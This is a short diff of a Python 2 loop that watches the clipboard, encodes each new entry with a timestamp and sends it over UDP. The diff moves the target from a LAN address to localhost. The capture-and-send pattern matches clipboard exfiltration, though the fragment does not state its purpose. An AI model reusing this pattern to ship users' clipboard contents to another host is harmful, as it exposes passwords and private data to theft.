@@ -16,4 +16,4 @@ while True:
         olddata = clipdata
         print clipdata
         message = (str(time.time())+":"+clipdata).encode("bz2").encode("base64")
-        s.sendto(message,("192.168.12.9",80))
+        s.sendto(message,("127.0.0.1",80))
